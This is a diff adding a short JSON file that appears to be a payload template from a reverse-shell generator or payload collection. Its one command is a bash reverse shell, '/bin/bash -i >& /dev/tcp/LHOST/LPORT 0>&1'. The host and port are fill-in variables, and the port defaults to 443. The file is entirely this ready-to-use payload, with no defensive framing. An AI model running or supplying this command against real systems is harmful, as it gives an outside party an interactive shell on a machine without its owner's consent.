@@ -1,0 +1,10 @@
+{
+	"line": "/bin/bash -c '/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",
+	"variables": {
+        "LHOST": "LHOST",
+        "LPORT": "LPORT"
+	},
+    "defaults": {
+        "LPORT": "443"
+    }
+}
